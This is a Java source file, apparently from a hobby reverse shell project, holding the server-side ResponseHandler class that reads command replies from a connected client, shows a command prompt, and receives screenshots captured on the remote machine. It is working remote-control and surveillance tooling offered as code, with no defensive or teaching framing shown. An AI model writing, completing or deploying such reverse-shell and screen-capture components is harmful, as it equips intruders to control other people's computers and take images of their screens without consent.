package obs1d1anc1ph3r.reverseshell.server;

import java.io.*;
import java.net.Socket;

public class ResponseHandler implements Runnable {

    private BufferedReader in;
    private PrintWriter out;
    private Socket clientSocket;
    private ReceiveScreenShot screenshotHandler;

    public ResponseHandler(BufferedReader in, PrintWriter out, Socket clientSocket) {
        this.in = in;
        this.out = out;
        this.clientSocket = clientSocket;
        this.screenshotHandler = new ReceiveScreenShot();
    }

    @Override
    public void run() {
        try (DataInputStream dataIn = new DataInputStream(clientSocket.getInputStream())) {
            String response;
            while (true) {
                response = in.readLine();
                if (response == null) {
                    System.out.println("[DEBUG] Connection closed, exiting...");
                    break;
                }

                System.out.println("[DEBUG] Response received: " + response);
                if (response.equalsIgnoreCase("End")) {
                    System.out.print("[-] Command> ");
                } else if (response.equalsIgnoreCase("screenshot")) {
                    System.out.println("[-] Screenshot confirmation received. Preparing to receive screenshot...");
                    screenshotHandler.receiveScreenshot(clientSocket);
                } else {
                    System.out.println("[*] Response received: " + response);
                }

                if (dataIn.available() > 0) {
                    System.out.println("[DEBUG] Binary data available...");
                    int length = dataIn.readInt();
                    byte[] imageBytes = new byte[length];
                    dataIn.readFully(imageBytes);

                    System.out.println("[-] Received screenshot data of size: " + imageBytes.length + " bytes.");
                    screenshotHandler.receiveScreenshot(imageBytes);
                }

                try {
                    Thread.sleep(50); 
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                }
            }
        } catch (IOException e) {
            if (e instanceof java.net.SocketException) {
                System.err.println("[ERROR] Connection closed by client: " + e.getMessage());
            } else {
                System.err.println("[ERROR] Error reading response: " + e.getMessage());
            }
        } finally {
            closeResources();
            System.out.println("[*] ResponseHandler thread exiting.");
        }
    }

    private void closeResources() {
        try {
            if (in != null) {
                in.close();
            }
            if (out != null) {
                out.close();
            }
            if (clientSocket != null && !clientSocket.isClosed()) {
                clientSocket.close();
            }
        } catch (IOException e) {
            System.err.println("[ERROR] Error closing resources: " + e.getMessage());
        }
    }
}
